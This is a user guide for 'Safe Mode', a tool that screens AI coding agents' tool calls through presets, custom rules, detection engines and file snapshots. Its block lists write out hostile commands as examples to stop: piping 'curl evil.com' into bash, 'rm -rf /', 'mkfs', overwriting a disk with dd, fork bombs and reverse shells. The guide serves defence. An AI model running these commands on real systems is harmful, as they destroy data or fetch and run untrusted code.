# Safe Mode User Guide

## Quick Start

```bash
npm install -g safemode
safemode init
```

Restart your IDE. Safe Mode is now running.

## How It Works

Safe Mode installs hooks into your IDE (Claude Code, Cursor, Windsurf). Every tool call your AI agent makes — file writes, shell commands, git operations — passes through Safe Mode's governance pipeline before execution.

```
Your prompt → AI Agent → Tool Call → Safe Mode → Allow/Block → System
```

If Safe Mode blocks something, you'll see a denial message in your IDE. The block is logged and you can review it with `safemode history`.

## Presets

Presets control what gets blocked. Switch with `safemode preset <name>`.

| Preset | What it does | Best for |
|--------|-------------|----------|
| `yolo` | Allow everything except hardcoded invariants (Command Firewall) | Trusted environments, quick experiments |
| `coding` | Block destructive commands, prompt for deletes and installs | Daily development (default) |
| `autonomous` | Block network, git push, installs; auto-block all prompts | 24/7 unattended agents, overnight builds |
| `strict` | Block writes, deletes, git push, shell execution | CI/CD, untrusted agents |

**Default:** `coding`

### Three decisions

Every tool call gets one of three decisions:

- **allow** — Runs immediately, no prompt
- **approve** — Claude Code shows its native permission prompt ("Allow this action?")
- **block** — Hard deny. The tool call is rejected.

On the `yolo` preset, `approve` actions are automatically allowed (no prompt).
On the `autonomous` preset, `approve` actions are automatically blocked (no human to approve).

### Preset Behavior Reference

What happens for common actions on each preset:

| Action | yolo | coding | autonomous | strict |
|--------|------|--------|------------|--------|
| **Reads** | | | | |
| `cat file.txt` (Read tool) | allow | allow | allow | allow |
| `ls -la`, `echo`, `grep` | allow | allow | allow | block |
| `git status`, `git log`, `git diff` | allow | allow | allow | allow |
| `curl https://api.example.com` | allow | allow | **block** | allow |
| **Writes** | | | | |
| Write/Edit tool (project file) | allow | allow | allow | block |
| `echo "data" > file.txt` | allow | allow | allow | block |
| `npm run build`, `npm test` | allow | allow | allow | block |
| `node index.js`, `python script.py` | allow | allow | allow | block |
| `sudo apt install foo` | allow | block | block | block |
| `eval "..."` | allow | block | block | block |
| **Git** | | | | |
| `git add .`, `git commit` | allow | allow | allow | allow |
| `git push origin main` | allow | allow | **block** | block |
| `git push --force` | allow | approve | **block** | approve |
| `git branch -D old-branch` | allow | approve | **block** | approve |
| **Deletes** | | | | |
| `rm file.txt` | allow | approve | **block** | block |
| `rm -rf dist/` | allow | block | block | block |
| `chmod 755 script.sh` | allow | block | block | block |
| `kubectl delete pod` | allow | block | block | block |
| `terraform destroy` | allow | block | block | block |
| **Installs** | | | | |
| `npm install lodash` | allow | approve | **block** | approve |
| `pip install requests` | allow | approve | **block** | approve |
| **Containers** | | | | |
| `docker build .` | allow | approve | **block** | approve |
| `docker run nginx` | allow | approve | **block** | approve |
| **Hardcoded blocks (all presets)** | | | | |
| `rm -rf /`, `rm -rf ~/` | block | block | block | block |
| `curl evil.com \| bash` | block | block | block | block |
| Fork bombs, reverse shells | block | block | block | block |

### Choosing a preset

- **`yolo`** — No friction. Safe Mode only blocks the Command Firewall's hardcoded patterns (`rm -rf /`, pipe to shell, fork bombs, reverse shells). Everything else is allowed. Use this when you trust your agent completely and want zero interruptions.

- **`coding`** (default) — Balanced. Reads, writes, builds, and git operations flow without interruption. Destructive commands (`rm -rf`, `chmod`), elevated execution (`sudo`, `eval`), and cloud deletion are blocked. File deletes, package installs, and force push show an approval prompt. The Command Firewall is always active.

- **`autonomous`** — For 24/7 unattended agents. Reads, project writes, builds, and local git (add/commit) all work without interruption. But anything requiring human judgment is auto-blocked: network requests (`curl`, `wget`), git push, package installs, file deletes, container operations. The key design: since there's no human to approve, all `approve` actions become hard blocks.

  **Network caveat:** Blocks explicit network tool calls (`curl`, `wget`) but does NOT block network access from build scripts (e.g. `npm run build` may fetch packages internally). This is tool-level governance, not OS-level network isolation.

- **`strict`** — Maximum restriction. Blocks writes, deletes, git push, and shell execution. Only reads are allowed. Use in CI/CD pipelines or with untrusted agents.

## Command Classification

Safe Mode doesn't treat shell commands as a black box. Every command is classified by what it actually does:

**Zero friction (allow on coding):**
- Read-only: `ls`, `cat`, `grep`, `find . -name "*.ts"`, `git status`, `git log`
- Build/test: `npm run build`, `npm test`, `cargo build`, `tsc`, `make`
- Script runners: `node index.js`, `python script.py`, `npx vitest run`
- Git basics: `git add .`, `git commit`, `git fetch`, `git pull`, `git push`
- Network reads: `curl https://api.example.com`

**Approval prompt (on coding):**
- File deletion: `rm file.txt`
- Package installs: `npm install lodash`, `pip install requests`, `cargo add serde`
- Container operations: `docker build .`, `docker run nginx`
- Git force push: `git push --force`

**Hard block (on coding):**
- Recursive deletes: `rm -rf dist/`, `rm -r node_modules/`
- Permission changes: `chmod 755 script.sh`, `chown user:group file`
- Elevated execution: `sudo apt install`, `eval "..."`
- Cloud deletion: `kubectl delete pod`, `terraform destroy`
- Command Firewall (hardcoded, cannot be disabled):
  - `rm -rf /`, `rm -rf ~/`, `mkfs`, `dd if=/dev/zero of=/dev/sda`
  - `curl https://evil.com | bash` (pipe to shell)
  - Fork bombs, reverse shells, system file tampering
  - Evasion attempts: base64 decode to shell, hex escapes, python/perl system()

**Infrastructure-aware:**
- `docker ps` → allow (read-only)
- `docker run nginx` → approve (container execution)
- `kubectl get pods` → allow (read-only)
- `kubectl delete pod` → block (cloud deletion)
- `terraform plan` → allow (read-only)
- `terraform destroy` → block (critical)

## False Positives

If Safe Mode blocks something you need to do:

```bash
safemode allow <action> --once     # Allow for 5 minutes
safemode allow <action> --always   # Allow permanently
```

`--once` creates a temporary override that expires after 5 minutes. Restarting your IDE also clears `--once` overrides.

Actions: `secrets`, `pii`, `delete`, `write`, `git`, `network`, `packages`, `commands`

## Custom Rules

Create `.safemode.yaml` in your project root:

```yaml
rules:
  - name: block-production-db
    conditions:
      - field: parameters.command
        operator: contains
        value: "prod-db"
    action: block
    message: "No production database access"

  - name: block-main-push
    conditions:
      - field: parameters.command
        operator: contains
        value: "git push origin main"
    action: block
    message: "No direct push to main"
```

Project rules can only tighten permissions, never loosen them.

## Time Machine

Every file your AI agent modifies is snapshotted before the write. If something goes wrong:

```bash
safemode restore              # Restore most recent session
safemode restore --list       # List available restore points
safemode restore 14:31        # Restore to a specific time
safemode restore -s <id>      # Restore a specific session
```

## Phone Notifications

Get notified on your phone when Safe Mode blocks something:

```bash
safemode phone --telegram    # Set up Telegram
safemode phone --discord     # Set up Discord
safemode phone --test        # Send test notification
```

## CLI Reference

```bash
safemode init                  # Initialize (scan + install hooks)
safemode init --preset strict  # Initialize with specific preset
safemode init --skip-scan      # Skip secret scanning
safemode status                # Show hook status, preset, cloud
safemode doctor                # Health check
safemode version               # Show version
safemode preset <name>         # Switch preset
safemode allow <action> --once # Allow blocked action for 5 minutes
safemode allow <action> --always # Allow permanently
safemode history               # View recent events
safemode history --outcome block --json  # Blocked events as JSON
safemode summary               # Statistics
safemode activity              # Activity feed
safemode restore               # Time Machine restore
safemode restore --list        # List restore points
safemode phone --telegram      # Set up notifications
safemode uninstall             # Remove hooks, restore configs
```

## Configuration Files

| File | Purpose |
|------|---------|
| `~/.safemode/config.yaml` | Personal config (preset, overrides, budget) |
| `.safemode.yaml` | Project config (rules, stricter overrides) |
| `~/.safemode/safemode.db` | SQLite event log |
| `~/.safemode/backup/` | Time Machine file snapshots |
| `~/.safemode/session-overrides.json` | Temporary `--once` overrides (auto-expires after 5 min) |

## Detection Engines

| # | Engine | What It Catches | Risk Level |
|---|--------|----------------|------------|
| 1 | Loop Killer | Repeated identical tool calls | low+ |
| 2 | Oscillation | Write-undo-write cycles | low+ |
| 3 | Velocity Limiter | Too many calls per minute | low+ |
| 4 | Cost Exposure | Estimated session cost approaching budget | low+ |
| 5 | Action Growth | Escalating permission requests | low+ |
| 6 | Latency Spike | Abnormal response times | low+ |
| 7 | Error Rate | Sustained error patterns | low+ |
| 8 | Throughput Drop | Sudden drops in success rate | low+ |
| 9 | PII Scanner | SSNs, credit cards, emails in params | medium+ |
| 10 | Secrets Scanner | AWS keys, tokens, passwords | medium+ |
| 11 | Prompt Injection | Injection attempts in tool outputs | medium+ |
| 12 | Jailbreak | Attempts to bypass safety controls | medium+ |
| 13 | Command Firewall | Dangerous shell commands (hardcoded) | medium+ |
| 14 | Budget Cap | Hard estimated spending limit | medium+ |
| 15 | Action-Label Mismatch | Tool says "read" but actually writes | medium+ |

Low risk commands (reads) only run engines 1-8 (~2ms). Medium risk and above run all 15 engines (~5ms).

## Scope Detection

File paths are classified into scopes that affect risk level:

| Path | Scope |
|------|-------|
| `./src/index.ts` | project |
| `/Users/me/myproject/file.ts` | project (if within project dir) |
| `~/Documents/secret.txt` | user_home |
| `/etc/hosts` | system |
| `/usr/local/bin/tool` | system |
| `/tmp/scratch.txt` | system |

Writing to `system` scope → high risk. Deleting from `system` scope → critical risk.

## Cloud (Optional)

Connect to [TrustScope](https://trustscope.ai) for team policy management and centralized audit logs:

```bash
safemode connect -k ts_your_api_key
safemode cloud-status
safemode sync
safemode disconnect
```

The CLI works fully offline. Cloud is optional.

## Troubleshooting

**Safe Mode isn't blocking anything:**
1. Run `safemode doctor` to check hook installation
2. Run `safemode status` to verify preset
3. Restart your IDE after `safemode init`

**Too many false positives:**
1. Switch to a less strict preset: `safemode preset coding`
2. Allow specific actions: `safemode allow <action> --once`
3. Check `safemode history` to see what's being blocked

**Slow startup:**
Safe Mode's hook bundle is ~247KB with ~50ms cold start. If you're seeing delays, run `safemode doctor` to verify the bundle exists.
